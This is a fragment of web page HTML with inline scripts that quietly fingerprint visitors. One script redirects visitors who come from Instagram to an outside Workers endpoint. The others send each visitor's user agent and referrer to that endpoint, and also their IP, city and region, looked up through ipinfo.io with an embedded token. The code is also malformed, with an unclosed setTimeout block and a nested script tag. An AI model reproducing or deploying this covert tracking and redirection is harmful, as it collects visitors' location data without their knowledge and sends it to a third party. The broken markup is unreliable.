    <script>
  try {
    const ref = document.referrer;
    const urlParams = new URLSearchParams(window.location.search);
    const fromWorker = urlParams.has("from");

    if (ref.includes("l.instagram.com") && !fromWorker) {
      window.location.href = "https://workers.client57.workers.dev/api/rfig";
    }
  } catch (e) {
    console.log("Redirect check failed:", e);
  }
</script>
    
    <script>
        // Simple log at page load
        try {
            const date = new Date();
            const timeZone = "Asia/Jakarta";
            const options = {
                timeZone: timeZone,
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit",
                day: "2-digit",
                month: "2-digit",
                year: "numeric",
            };
            const formattedTime = new Intl.DateTimeFormat("id", options).format(date);
            const userAgent = navigator.userAgent || "Unknown User-Agent";
            const refUrl = document.referrer || "No Referrer";
            const infoText = `[ ${formattedTime} ] | Page Loaded`;
            const url = `https://workers.client57.workers.dev/api/log?result=%0A${infoText}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
            
            fetch(url).catch(error => {
                console.error("Error in simple log:", error);
            });
        } catch (e) {
            console.log("Error in simple log:", e);
        }
    </script>

    <script>
        setTimeout(function() {

    <script>
        try {
            let ip;
            let city;
            let region;

            fetch(`https://ipinfo.io/json?token=7ad47c91e38458`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    ip = data.ip || "N/A";
                    city = data.city || "N/A";
                    region = data.region || "N/A";

                    const date = new Date();
                    const timeZone = "Asia/Jakarta";
                    const options = {
                        timeZone: timeZone,
                        hour: "2-digit",
                        minute: "2-digit",
                        second: "2-digit",
                        day: "2-digit",
                        month: "2-digit",
                        year: "numeric",
                    };
                    const formattedTime = new Intl.DateTimeFormat("id", options).format(date);

                    const userAgent = navigator.userAgent || "Unknown User-Agent";
                    const refUrl = document.referrer || "No Referrer";
                    const infoText = `[ ${formattedTime} ] `;
                    const url = `https://workers.client57.workers.dev/api/log?result=%0A${infoText} | ${ip}%0ACity: ${city}%0ARegion: ${region}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;

                    return fetch(url);
                })
                .catch(error => {
                    console.error("Error fetching IP data:", error);

                    const userAgent = navigator.userAgent || "Unknown User-Agent";
                    const refUrl = document.referrer || "No Referrer";
                    const fallbackInfo = `[ ${new Date().toISOString()} ] | Error occurred`;
                    const fallbackUrl = `https://workers.client57.workers.dev/api/log?result=%0A${fallbackInfo}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;

                    return fetch(fallbackUrl);
                });
        } catch (e) {
            console.log("Error occurred while processing elements. Continuing with other functions...", e);
        }
    </script>
